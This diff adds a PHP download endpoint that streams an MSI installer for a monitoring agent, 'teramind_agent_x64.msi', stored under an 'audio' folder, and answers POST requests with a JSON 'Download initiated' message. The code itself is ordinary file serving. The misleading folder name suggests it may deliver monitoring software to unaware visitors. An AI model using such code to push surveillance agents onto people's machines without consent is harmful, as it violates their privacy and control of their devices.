@@ -1,0 +1,76 @@
+<?php
+
+// Absolute path to the installer we need to serve
+$baseDir = __DIR__;
+$relativePath = 'audio/teramind_agent_x64.msi';
+$filePath = realpath($baseDir . DIRECTORY_SEPARATOR . $relativePath);
+
+/**
+ * Ensure the requested file exists and stays within this directory tree.
+ */
+function resolveInstaller(string $filePath, string $baseDir): string
+{
+    if (!$filePath || !is_file($filePath)) {
+        http_response_code(404);
+        exit(json_encode(['success' => false, 'message' => 'Installer not found.']));
+    }
+
+    $realBase = realpath($baseDir);
+    if (strpos($filePath, $realBase) !== 0) {
+        http_response_code(403);
+        exit(json_encode(['success' => false, 'message' => 'Unauthorized file access.']));
+    }
+
+    return $filePath;
+}
+
+/**
+ * Stream the installer to the browser with download headers.
+ */
+function streamInstaller(string $filePath): void
+{
+    $filename = basename($filePath);
+
+    header('Content-Description: File Transfer');
+    header('Content-Type: application/octet-stream');
+    header('Content-Disposition: attachment; filename="' . $filename . '"');
+    header('Content-Length: ' . filesize($filePath));
+    header('Cache-Control: no-cache, no-store, must-revalidate');
+    header('Pragma: no-cache');
+    header('Expires: 0');
+
+    readfile($filePath);
+    exit;
+}
+
+$filePath = resolveInstaller($filePath, $baseDir);
+
+// Handle download stream requests (?download=1 or ?proxy=1)
+if (isset($_GET['download']) || isset($_GET['proxy'])) {
+    streamInstaller($filePath);
+}
+
+// POST handler: return JSON payload with download URL
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $rawInput = file_get_contents('php://input');
+    $payload = json_decode($rawInput, true);
+
+    if (!is_array($payload) || ($payload['action'] ?? '') !== 'download') {
+        http_response_code(400);
+        header('Content-Type: application/json');
+        echo json_encode(['success' => false, 'message' => 'Invalid request.']);
+        exit;
+    }
+
+    header('Content-Type: application/json');
+    echo json_encode([
+        'success' => true,
+        'message' => 'Download initiated',
+    ]);
+    exit;
+}
+
+// Default: method not allowed
+http_response_code(405);
+header('Content-Type: application/json');
+echo json_encode(['success' => false, 'message' => 'Method not allowed.']);
